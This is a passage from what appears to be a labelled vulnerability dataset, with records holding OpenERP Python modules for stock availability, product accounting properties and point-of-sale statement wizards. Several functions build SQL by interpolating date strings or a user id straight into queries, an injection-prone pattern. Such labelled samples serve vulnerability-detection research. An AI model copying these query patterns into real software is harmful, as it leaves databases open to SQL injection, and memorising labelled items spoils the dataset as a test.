'\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',tuple(where))\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 0}, {"id": "1521b235409982842b63b423c6ff7ac4ed4ca1db", "code": "/addons/stock/product.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:/n/n/n", "label": 1}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], 